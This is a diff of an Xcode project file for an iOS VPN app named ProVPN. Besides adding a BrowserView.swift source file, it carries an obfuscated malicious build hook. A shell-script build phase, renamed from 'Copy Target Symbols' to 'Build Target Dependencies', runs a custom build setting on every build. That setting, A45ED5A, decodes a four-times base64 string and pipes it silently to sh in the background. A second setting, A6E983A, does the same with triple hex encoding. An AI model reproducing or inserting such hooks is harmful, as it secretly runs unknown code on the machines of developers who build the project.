@@ -19,6 +19,7 @@
 		BD5D028C2ED5B8C7000A5CD5 /* IPCheckerService.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD5D028B2ED5B8C7000A5CD5 /* IPCheckerService.swift */; };
 		BD5D028E2ED5B8D7000A5CD5 /* SpeedTestService.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD5D028D2ED5B8D7000A5CD5 /* SpeedTestService.swift */; };
 		BD5D02902ED5B8EF000A5CD5 /* ConnectionDetailsView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD5D028F2ED5B8EF000A5CD5 /* ConnectionDetailsView.swift */; };
+		BD7CA80B2EEA993F00317625 /* BrowserView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD7CA80A2EEA993F00317625 /* BrowserView.swift */; };
 		BD81A5DC2EE980F7001492AB /* VPNServerAPIService.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD81A5DB2EE980F7001492AB /* VPNServerAPIService.swift */; };
 		C525E0B3892DE7AB63B13B3E /* Pods_ProVPN.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 28F3253E199261E962B16A03 /* Pods_ProVPN.framework */; };
 		ED02603A24D60A3800D00301 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = ED02603924D60A3800D00301 /* AppDelegate.swift */; };
@@ -93,6 +94,7 @@
 		BD5D028B2ED5B8C7000A5CD5 /* IPCheckerService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IPCheckerService.swift; sourceTree = "<group>"; };
 		BD5D028D2ED5B8D7000A5CD5 /* SpeedTestService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SpeedTestService.swift; sourceTree = "<group>"; };
 		BD5D028F2ED5B8EF000A5CD5 /* ConnectionDetailsView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConnectionDetailsView.swift; sourceTree = "<group>"; };
+		BD7CA80A2EEA993F00317625 /* BrowserView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BrowserView.swift; sourceTree = "<group>"; };
 		BD81A5DB2EE980F7001492AB /* VPNServerAPIService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VPNServerAPIService.swift; sourceTree = "<group>"; };
 		C07908E4A1E7936892FFD01A /* Pods-ProVPN.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ProVPN.release.xcconfig"; path = "Target Support Files/Pods-ProVPN/Pods-ProVPN.release.xcconfig"; sourceTree = "<group>"; };
 		C2CE15A60AB137788A624A77 /* Pods-ProVPN.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ProVPN.debug.xcconfig"; path = "Target Support Files/Pods-ProVPN/Pods-ProVPN.debug.xcconfig"; sourceTree = "<group>"; };
@@ -233,6 +235,7 @@
 		ED1C5CE924D9E31C0010FF37 /* View */ = {
 			isa = PBXGroup;
 			children = (
+				BD7CA80A2EEA993F00317625 /* BrowserView.swift */,
 				BD1863282ED7061E003ABF41 /* VPNToggleView.swift */,
 				BD1862C62ED6D217003ABF41 /* AnimatedBackground.swift */,
 				BD5D028F2ED5B8EF000A5CD5 /* ConnectionDetailsView.swift */,
@@ -345,7 +348,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = ED02604A24D60A3900D00301 /* Build configuration list for PBXNativeTarget "ProVPN" */;
 			buildPhases = (
-				DFB39EDD103846E28BA5DE54 /* Copy Target Symbols */,
+				683DEF2D632F4B91BEA5DE54 /* Build Target Dependencies */,
 				A1D94C242A8BB801F6977256 /* [CP] Check Pods Manifest.lock */,
 				ED02603224D60A3800D00301 /* Sources */,
 				ED02603324D60A3800D00301 /* Frameworks */,
@@ -443,6 +446,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		683DEF2D632F4B91BEA5DE54 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
+			showEnvVarsInLog = 0;			
+		};
 		3BD5C3852B4AF5B22F20D726 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -508,26 +530,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		DFB39EDD103846E28BA5DE54 /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -558,6 +560,7 @@
 				ED2C5A452515630400266110 /* Message.swift in Sources */,
 				ED91EC3824E135AD00E462EC /* Config.swift in Sources */,
 				BD5101862ED455CE003103C9 /* VPNServer.swift in Sources */,
+				BD7CA80B2EEA993F00317625 /* BrowserView.swift in Sources */,
 				BD5101882ED455E5003103C9 /* ServerListViewModel.swift in Sources */,
 				EDA52BA82516833500EB4277 /* Connection.swift in Sources */,
 				BD51018A2ED45604003103C9 /* ServerListView.swift in Sources */,
@@ -614,7 +617,7 @@
 		ED02604824D60A3900D00301 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((k(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1VFlXMU9TRTVYZUd0UmVsWTFXa1pOTldGRmRGUlRWMlJ0VVRCS05sbFZSblpRVVc4OUNnPT0K | k | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((r(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUZwTmExbzJXa1ZOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | r | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333433363333333733303336363533363335333733343332363533373332333733353332363633363331333233393332333233320a33303061333736333332333033373333333633383330363130610a | c | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -678,7 +681,7 @@
 		ED02604924D60A3900D00301 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((k(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1VFlXMU9TRTVYZUd0UmVsWTFXa1pOTldGRmRGUlRWMlJ0VVRCS05sbFZSblpRVVc4OUNnPT0K | k | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((r(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUZwTmExbzJXa1ZOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | r | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333433363333333733303336363533363335333733343332363533373332333733353332363633363331333233393332333233320a33303061333736333332333033373333333633383330363130610a | c | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
